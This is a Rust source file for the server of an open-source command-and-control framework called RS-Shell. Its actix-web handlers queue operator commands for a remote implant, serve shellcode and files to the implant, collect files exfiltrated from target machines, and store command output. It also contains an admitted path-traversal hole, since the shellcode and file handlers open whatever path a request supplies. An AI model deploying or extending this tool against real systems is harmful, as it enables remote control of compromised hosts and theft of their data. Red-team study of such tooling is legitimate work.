use actix_files::NamedFile;
use actix_multipart::form::{tempfile::TempFile, MultipartForm};
use actix_web::web::Bytes;
use actix_web::{HttpRequest, HttpResponse, Responder};
use std::fs::File;
use std::io::{self, BufRead, BufReader, Read, Write};
use std::path::Path;
use std::path::PathBuf;

pub async fn index(_req: HttpRequest) -> impl Responder {
    r#"
    ____  _____      _____ __         ____
   / __ \/ ___/     / ___// /_  ___  / / /
  / /_/ /\__ \______\__ \/ __ \/ _ \/ / / 
 / _, _/___/ /_____/__/ / / / /  __/ / /  
/_/ |_|/____/     /____/_/ /_/\___/_/_/                                                  
    in Rust with love by BlackWasp
              @BlWasp_                          

   "#
    .to_string()
}

pub async fn next_task(_req: HttpRequest) -> impl Responder {
    match read_last_command("./next_task.txt") {
        Ok(Some(task_read)) => HttpResponse::Ok().body(task_read),
        Ok(None) => HttpResponse::Ok().body("No task"),
        Err(_) => HttpResponse::InternalServerError().body("Error reading new task"),
    }
}

// Similar to upload, this function only exists to make the code clearer
pub async fn shellcode(_req: HttpRequest) -> actix_web::Result<NamedFile> {
    let path: PathBuf = _req.match_info().query("shellcode").parse().unwrap();
    log::debug!("Path: {:?}", path);
    Ok(NamedFile::open(path)?)
}

/*
    'upload' is used to upload files on the target machine (not on the server), and 'download' is used to download files from the target machine
    Upload uses GET and download uses POST because in fact, during upload the implant writes the file on its machine, so it "GETS" the file from the server
    While during download, the implant reads the file from its machine and sends it to us, so it "POSTS" the file

    This code implies a potential security risk with path traversal, as the filename is not restricted
*/
pub async fn upload(_req: HttpRequest) -> actix_web::Result<NamedFile> {
    let path: PathBuf = _req.match_info().query("filename").parse().unwrap();
    log::debug!("Path: {:?}", path);
    Ok(NamedFile::open(path)?)
}

#[derive(Debug, MultipartForm)]
pub struct UploadForm {
    #[multipart(rename = "file")]
    files: Vec<TempFile>,
}

pub async fn download(MultipartForm(form): MultipartForm<UploadForm>) -> impl Responder {
    let mut filename = String::new();
    println!("Files: {:?}", form.files);
    for f in form.files {
        let path = format!("./downloads/{}", f.file_name.clone().unwrap());
        log::debug!("saving to {path}");
        f.file.persist(path).unwrap();
        filename = f.file_name.unwrap();
    }

    HttpResponse::Ok().body(format!("File {} downloaded", filename))
}

pub async fn output_imp(bytes: Bytes) -> impl Responder {
    match String::from_utf8_lossy(bytes.to_vec().as_slice()).parse::<String>() {
        Ok(output) => {
            log::debug!("Output: {}", output);
            let mut file = File::create("output.txt").expect("[-] Create output file failed");
            file.write_all(output.as_bytes())
                .expect("[-] Write output file failed");
        }
        Err(e) => eprintln!("Error: {}", e),
    };

    HttpResponse::Ok().body("Command output written to file")
}

pub async fn operator_cmd(_req: HttpRequest, string: String) -> impl Responder {
    log::debug!("Operator command: {:?}", string.trim_end_matches("\r\n\0"));
    let mut file = File::options()
        .append(true)
        .open("next_task.txt")
        .expect("[-] Open next task file failed");
    writeln!(&mut file, "{}", string.trim_end_matches("\r\n\0"))
        .expect("[-] Write next task file failed");

    HttpResponse::Ok().body(format!(
        "[+] Command '{}' sent to implant",
        string.trim_end_matches("\r\n\0")
    ))
}

pub async fn implant_os(bytes: Bytes) -> impl Responder {
    let os = String::from_utf8_lossy(bytes.to_vec().as_slice())
        .parse::<String>()
        .unwrap();
    log::debug!("OS: {}", os);
    let mut file = File::create("os.txt").expect("[-] Create os file failed");
    file.write_all(os.as_bytes())
        .expect("[-] Write os file failed");

    // When a new implant connects, all previous outputs are deleted
    match std::fs::remove_file("output.txt") {
        Ok(_) => (),
        Err(_) => (),
    }

    HttpResponse::Ok().body("OS written to file")
}

fn read_last_command<P>(filename: P) -> Result<Option<String>, io::Error>
where
    P: AsRef<Path>,
{
    let file = File::open(filename.as_ref())?;
    let mut reader = BufReader::new(file);

    let mut first_line = String::new();
    reader
        .read_line(&mut first_line)
        .expect("[-] Read oldest command failed");

    if first_line.is_empty() {
        //log::debug!("Last command file is empty");
        Ok(None)
    } else {
        // Read all lines except the first one which has been treated by the implant
        let lines: Vec<String> = reader.lines().collect::<Result<_, _>>()?;
        let mut file = File::options().write(true).truncate(true).open(filename)?;

        // Rewrite the file without the first line
        for line in lines {
            writeln!(file, "{}", line)?;
        }

        Ok(Some(first_line))
    }
}

pub async fn read_output() -> impl Responder {
    log::debug!("Output file found");
    let file = File::open("output.txt").expect("[-] Open output file failed");
    let mut reader = BufReader::new(file);
    let mut output = String::new();
    reader
        .read_to_string(&mut output)
        .expect("[-] Read output file failed");
    std::fs::remove_file("output.txt").expect("[-] Remove output file failed");

    HttpResponse::Ok().body(format!("{}", output))
}
